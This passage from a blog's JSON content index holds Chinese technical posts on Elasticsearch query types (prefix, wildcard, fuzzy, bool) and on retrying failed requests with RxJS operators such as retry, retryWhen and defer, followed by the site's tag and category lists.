\"2016-12-31\", \"format\": \"yyyy-MM-dd\" } } }} 其结果如图： exists query匹配有这个属性的文档。比如我想找到存在 title 字段的文档： 123456789GET books/_search{ \"_source\": \"title\", \"query\": { \"exists\": { \"field\": \"title\" } }} 结果会返回所有的文档。那么如何定义 有这个属性 呢？ 定义的规则如下： {&quot;title&quot;: &quot;js&quot;}: 存在 {&quot;title&quot;: &quot;&quot;}: 存在 {&quot;title&quot;: [&quot;js&quot;]}: 存在 {&quot;title&quot;: [&quot;js&quot;, null]}: 存在(有一个值不为空就行) {&quot;title&quot;: null}: 不存在 {&quot;title&quot;: []} 不存在 {&quot;title&quot;: [null]} 不存在 {&quot;foo&quot;: &quot;bar&quot;}: 不存在 perfix query用来匹配文档分词后的词项中的前缀。我们先写个DSL进行匹配下： 123456789GET books/_search{ \"_source\": \"description\", \"query\": { \"prefix\": { \"description\": \"wi\" } }} 其结果如图： 为何 wi 可以匹配到这个呢？因为 Elasticsearch 会对 description 进行分词，其中会把 winPython 分为 win Python。那么这两个就是文档分词后的词项，而 prefix 匹配每个词项的开头是否匹配，相当于js的 startsWith 方法。用代码诠释的话就是： 123456const dataItem = ['win', 'python'];const prefixKeyword = 'wi';const result = dataItem.some(item =&gt; item.startsWith(prefixKeyword));console.log(result); //=&gt; true wildcard querywildcard 为通配符查询。不过目前只支持 * 和 ?。所代表的含义为： *: 零个或多个 ?: 一个或多个 注意：wildcard 不是匹配全文，还是会对文档的字段进行分词，然后应用于每个词项 比如，我现在想查询 wi* 的文档： 123456789GET books/_search{ \"_source\": \"description\", \"query\": { \"wildcard\": { \"description\": \"wi*\" } }} 其结果如图： 首先 Elasticsearch 会先对 description 进行分词为：win 和 python。然后 wi* 会应用到每个词项里，其中 win 符合规则，则显示在结果中。 如果我用 win?，则不会有任何的结果，因为 ? 代表的是一个或多个。那么匹配到 win 的时候，后面没有字符串了，则结果为空。 regexp query其为正则表达式查询，原理同 wildcard，这里就不在阐述了。 fuzzy query可以把 fuzzy 理解为模糊查询。比如用户输入关键字时，一不小心输入错了，变成了 javascrpit，那么 fuzzy 的作用就出来了。它仍可以搜索到 javascript: 123456789GET books/_search{ \"_source\": \"description\", \"query\": { \"fuzzy\": { \"description\": \"javascrpit\" } }} 其结果如图： 复合查询复合查询就是把简单的查询组合在一起，从而实现更加复杂的查询。并且复合查询还可以控制另一个查询的行为。 constant_score query不太常用，用于对返回结果的文档进行打分。 这里就不在阐述了，如果感兴趣，可见：[Elasticsearch] 控制相关度 (四) - 忽略TF/IDF bool query这个查询方法，还是非常重要的。这个方法提供了以下操作方法： must: 文档必须满足 must 下面的查询条件，相当于AND 或者 &amp;&amp; should: 文档可以匹配 should 下的查询条件，匹配不出来也没事。相当于 OR 或者 || must_not: 和 must 相反，必须不满足 must_not 下面的查询条件，相当于 !== filter: 其功能和 must 一样，但是不会打分，也就说不会影响文档的 _score 字段 现在，我们想要查询：书籍作者(author)是 葛一鸣，书籍名称(title)里包含 java 的书籍，价格(price)不能高于 70 低于 40，并且书籍描述(description)可以包含或者不包含 虚拟机 的书籍。 123456789101112131415161718192021222324252627282930313233343536GET books/_search{ \"query\": { \"bool\": { \"filter\": { \"term\": { \"author\": \"葛一鸣\" } }, \"must\": [ { \"match\": { \"title\": \"java\" } } ], \"should\": [ { \"match\": { \"description\": \"虚拟机\" } } ], \"must_not\": [ { \"range\": { \"price\": { \"gt\": 70, \"lt\": 40 } } } ] } }} 其结果如图： dis_max query、function_score query、boosting query这三个就不在阐述了，其主要作用是关系到 _score，也就是关系到查询的结果的评分。感兴趣的，可以在网上搜下。","link":"/2018/12/30/reading-notes-from-lucene-to-elasticsearch-full-text-search/"},{"title":"聊聊RxJS中的错误重试","text":"前言最近工作中有一个需求是：如果这个请求超时，则进行重试，且重试次数可配置。 首先我们发请求使用的库为：Axios，其处理请求的位置，是在 redux-observable 中的 epic 里。 那么如果要完成重试机制的话，有两种办法： 在对 Axios 封装的函数里添加重试代码 在 epic 里，使用 RxJS 操作符进行重试。 关于 Axios 重试的，其实比较麻烦的，而且需要在原有封装好的函数里，继续添加重试代码，总感觉不太好。且维护起来也不太方便。于是那就使用 RxJS 操作符进行重试吧。本文代码将不会套用项目代码，而是重新写一个 Demo，方便理解。 RxJS 错误重试操作符在 RxJS 中，提供了两个操作符 retry 和 retryWhen。 需要注意的是：重试时，这两个操作符都会重试整个序列。 且 retry 和 retryWhen 只捕获 Error，但是对 Promise 有点无能为，解决方案文中会说明。 retryretry 操作符是用来指定重试次数，比如遇到错误了，将会重试n次。以下是 Demo: 12345678910111213const source = Rx.Observable.interval(1000)const example = source.map(val =&gt; { if (val === 2) { throw Error('error'); } return val;}).retry(1)example.subscribe({ next: val =&gt; console.log(val), error: val =&gt; console.log(val.message)}); 在线运行 上面的代码，会每隔1秒钟发出一次数字序列，当使用 subscribe 订阅后，一秒钟后会发出0，第二秒发出1，以此类推。 然后每次的数字序列都会到到达 map 操作符里，在 map 操作符中，我们可以看到当数字序列等于2时，则会抛出错误。不等于2时 ，则原封不动的返回，最终到达 subscribe 中的 next 函数。 运行结果如图： 首先发出0和1，没有问题，当val为2时，抛出错误。被 retry 捕获到，重新走一遍整个 RxJS 序列。于是会发现又发了一次0和1，这个时候又到2了，于是继续报错，但是 retry 的重试次数已经用完，则 retry 就不会再管了，直接跳过。于是被 subscribe 中的 error 函数捕获到。打印出 error。 retryWhen上面的 retry 操作符，只能用来设置重试次数，我们有时想做成：重试时，打印日志，或者其他操作。那么这个时候 retry 就不太适合了。所以我们需要 retryWhen 来操作。 代码如下： 1234567891011121314151617const source = Rx.Observable.interval(1000)const example = source.map(val =&gt; { if (val === 2) { throw Error('error') } return val;}).retryWhen(err =&gt; { return err .do(() =&gt; console.log('正在重试')) .delay(2000)})example.subscribe({ next: val =&gt; console.log(val), error: val =&gt; console.log(val.message)}); 在线运行 运行结果如图： 其发送逻辑和上面差不多，只是处理的时候不同了。 我们使用 retryWhen 操作符来控制重试的逻辑，我们先使用 do 操作符，在控制台打印字符串，再使用 delay 来延迟2秒进行重试。 但是这里会一直重试，没有设置重试次数的地方，解决方案在下一章节。 retry + retryWhen这个时候，我们发现 retry 可以设置重试次数，retryWhen 可以设置重试逻辑。 但是我们想设置重试次数，又想设置重试逻辑，那应该怎么办呢？ OK，先让我们看看 retryWhen 操作符。这个操作符如果内部触发了 Error 或者 Completed，那么就会停止重试，将会把内部触发的 Error 或者 Completed 交给 subscribe 的订阅操作符。可能这样说，比较麻烦，我们先上 Demo，按照 Demo 来说，会有助于理解： 123456789101112131415161718192021const source = Rx.Observable.interval(1000)const example = source.map(val =&gt; { if (val === 2) { throw Error('error') } return val;}).retryWhen(err =&gt; { return err .scan((acc, curr) =&gt; { if (acc &gt; 2) { throw curr } return acc + 1 }, 1)})example.subscribe({ next: val =&gt; console.log(val), error: val =&gt; console.log(val.message)}); 在线运行 结果如图： 发送逻辑没有变化，但是出现了新的操作符： scan，那么这个操作符是做什么用的呢？ 可以把 scan 理解为 javascript 中的 reduce 函数，这个操作符，具有两个参数，第一个是回调函数，第二个是默认值。就比如上面的代码，默认值是1，acc第一次是1，第二次重试时，acc就是2，第三次重试时，acc为3，已经大于2了，那么 if 表达式则会true，直接使用 throw 抛出 curr，这里的 curr 其实就是上面的错误原文。上文也说道了，如果在 scan 内初触发了 Error 则会停止重试，交给下面的 subscribe，然后触发了订阅的 error 函数，打印出 error。 其实满足重试次数后，把错误再抛出去，是比较正常的操作，让后面的操作符，对错误进行处理。但是可能有些人的业务需求是需要返回 Completed，那么可以参考下面的代码： 1234567891011121314151617181920const source = Rx.Observable.interval(200)const example = source.map(val =&gt; { if (val === 2) { throw Error('error') } return val;}).retryWhen(err =&gt; { return err .scan((acc, curr) =&gt; { return acc + 1 }, 0) .takeWhile(v =&gt; v &lt;= 2)})example.subscribe({ complete: () =&gt; console.log('Completed'), next: val =&gt; console.log(val), error: val =&gt; console.log(val.message)}); 在线运行 运行结果如图： 可以看到使用了一个新的操作符 takeWhile。这个操作符接受一个函数，如果这个函数返回了 true，则继续把值交给下面的操作符，一旦函数返回 false，则会触发 subscribe 中的 complete，也就是说这个序列已经完成。这样看的话，你就明白上面的代码的意图了。 解决Promise问题上文也说了 retry 和 retryWhen 是不支持 Promise.reject() 的，其实这里的表达不太准确，应该说是 Promise没有重试的API，当重试的时候Promise 已经在运行中了，所以无法再次调用该方法。也就造成了 retry 和 retryWhen 不能对 Promise 进行重试。那么解决方案也很简单了。 我们可以使用 defer 操作符，现在来简单说明下这个操作符的用处。 defer 接受一个函数参数，其函数不会运行，只有你使用 subscribe 去订阅的时候，才会去运行函数。并且运行函数，都是在独立的运行空间内，也就说，即使我们使用 Promise，也不会造成无法重试的情况，因为它不是复用之前的结果，而是重新开启一个新的内存空间，去运行函数，返回函数结果。 那么我们就可以把代码写成下面这样: 12345678910111213141516const getInfo: AxiosPromise = axios.get('http://xxx.com')const exp = defer(() =&gt; getInfo) .retryWhen(err =&gt; { return err.scan((acc, curr) =&gt; { if (acc &gt; 2) { throw curr } return acc + 1 }, 1) })example.subscribe({ next: val =&gt; console.log(val), error: val =&gt; console.log(val.message)}); 作者信息 Black-Hole Blog:http://bugs.cc/ Github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole","link":"/2019/01/12/rxjs-error-retry/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"Electron","slug":"Electron","link":"/tags/Electron/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Wireless Security","slug":"Wireless-Security","link":"/tags/Wireless-Security/"},{"name":"Web Security","slug":"Web-Security","link":"/tags/Web-Security/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Axios","slug":"Axios","link":"/tags/Axios/"},{"name":"Virtualization","slug":"Virtualization","link":"/tags/Virtualization/"},{"name":"NodeJs","slug":"NodeJs","link":"/tags/NodeJs/"},{"name":"Vue","slug":"Vue","link":"/tags/Vue/"},{"name":"Koa","slug":"Koa","link":"/tags/Koa/"},{"name":"Promise","slug":"Promise","link":"/tags/Promise/"},{"name":"Markdown","slug":"Markdown","link":"/tags/Markdown/"},{"name":"WAF","slug":"WAF","link":"/tags/WAF/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"Browser Plugin","slug":"Browser-Plugin","link":"/tags/Browser-Plugin/"},{"name":"Elasticsearch","slug":"Elasticsearch","link":"/tags/Elasticsearch/"},{"name":"DSL","slug":"DSL","link":"/tags/DSL/"},{"name":"Kibana","slug":"Kibana","link":"/tags/Kibana/"},{"name":"RxJS","slug":"RxJS","link":"/tags/RxJS/"}],"categories":[{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"React","slug":"JavaScript/React","link":"/categories/JavaScript/React/"},{"name":"Electron","slug":"JavaScript/React/Electron","link":"/categories/JavaScript/React/Electron/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"Web Security","slug":"Web-Security","link":"/categories/Web-Security/"},{"name":"XSS","slug":"Web-Security/XSS","link":"/categories/Web-Security/XSS/"},{"name":"Wireless Security","slug":"Wireless-Security","link":"/categories/Wireless-Security/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Virtualization","slug":"Virtualization","link":"/categories/Virtualization/"},{"name":"NodeJs","slug":"NodeJs","link":"/categories/NodeJs/"},{"name":"Elasticsearch","slug":"Elasticsearch","link":"/categories/Elasticsearch/"}]}